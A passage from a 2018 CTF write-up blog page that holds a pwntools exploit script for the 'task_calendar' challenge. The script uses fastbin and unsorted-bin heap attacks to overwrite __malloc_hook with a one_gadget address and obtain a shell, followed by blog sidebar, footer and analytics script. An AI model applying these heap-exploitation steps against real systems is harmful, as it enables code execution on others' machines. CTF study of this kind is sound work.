class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">gadget =[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./task_calendar'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(p)</span>:</span></span><br><span class="line">	f = open(<span class="string">'/proc/'</span>+str(pidof(p)[<span class="number">0</span>])+<span class="string">'/maps'</span>,<span class="string">'r'</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		tmp = f.readline()</span><br><span class="line">		<span class="keyword">print</span> tmp</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'libc-2.23.so'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">			libc_addr = int(<span class="string">'0x'</span>+tmp.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">			f.close()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	log.info(<span class="string">"libc_addr:%#x"</span>,libc_addr)</span><br><span class="line">	<span class="keyword">return</span> libc_addr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(day,size)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"4. exit\nchoice&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"7. Sunday\nchoice&gt; "</span>,str(day+<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"size&gt; "</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(day,size,info)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"4. exit\nchoice&gt; "</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"7. Sunday\nchoice&gt; "</span>,str(day+<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"size&gt; "</span>,str(size))</span><br><span class="line">	p.sendafter(<span class="string">"info&gt; "</span>,info)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(day)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"4. exit\nchoice&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"7. Sunday\nchoice&gt; "</span>,str(day+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_base = get_base(p)&amp;0xffff</span></span><br><span class="line">p.sendlineafter(<span class="string">"input calendar name&gt; "</span>,<span class="string">'0gur1'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)<span class="comment"># 0x00</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)<span class="comment"># 0x70</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">24</span>)  <span class="comment"># 0xe0 </span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)<span class="comment"># 0x100</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)<span class="comment"># 0x170</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)<span class="comment"># 0x1e0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite #1's size to an unsorted bin size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">24</span>,<span class="string">'0'</span>*<span class="number">24</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#now #1's chunk(0x100) is in the unsorted bin</span></span><br><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">1</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#now there are 3 chunks in fastbin:#3-&gt;#1-&gt;main_aren+88</span></span><br><span class="line"><span class="comment">#make:#3-&gt;#0-&gt;malloc_hook-0x23</span></span><br><span class="line">bytes = (get_base(p)+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">log.info(<span class="string">"bytes:%#x"</span>,bytes)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">1</span>,p32(bytes)[:<span class="number">-2</span>])</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)<span class="comment">#point to 3's chunk</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)<span class="comment">#point to 1's chunk</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)<span class="comment">#point to malloc_hook-0x23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(0,18,'a'*3+p64(0)+p64(0x7f))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#using unsorted bin attack to overwrite </span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">24</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">24</span>,<span class="string">'0'</span>*<span class="number">24</span>+<span class="string">'\xc1'</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">bytes = (get_base(p)+libc.symbols[<span class="string">'__malloc_hook'</span>])&amp;<span class="number">0xffff</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">24</span>,<span class="string">'0'</span>*<span class="number">24</span>+<span class="string">'\x61'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change main_arena+88 to one_gadget</span></span><br><span class="line">bytes = (get_base(p)+gadget[<span class="number">2</span>])&amp;<span class="number">0xffffff</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">21</span>,<span class="number">19</span>*<span class="string">'a'</span>+p32(bytes)[:<span class="number">-1</span>])</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/12/Teaser-Dragon-CTF-2018/" rel="next" title="Teaser Dragon CTF 2018">
+                <i class="fa fa-chevron-left"></i> Teaser Dragon CTF 2018
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.jpg"
+                alt="0gur1" />
+            
+              <p class="site-author-name" itemprop="name">0gur1</p>
+              <p class="site-description motion-element" itemprop="description">Stay hungry.Stay foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#task-calendar"><span class="nav-number">1.</span> <span class="nav-text">task_calendar</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本逻辑"><span class="nav-number">1.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bug"><span class="nav-number">1.2.</span> <span class="nav-text">bug</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用脚本"><span class="nav-number">1.4.</span> <span class="nav-text">利用脚本</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0gur1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客量:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("KvkboNezCqOpWaIBvOMgJE3K-gzGzoHsz", "slQuYxW7tjbda9dyxmi3dY4o");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
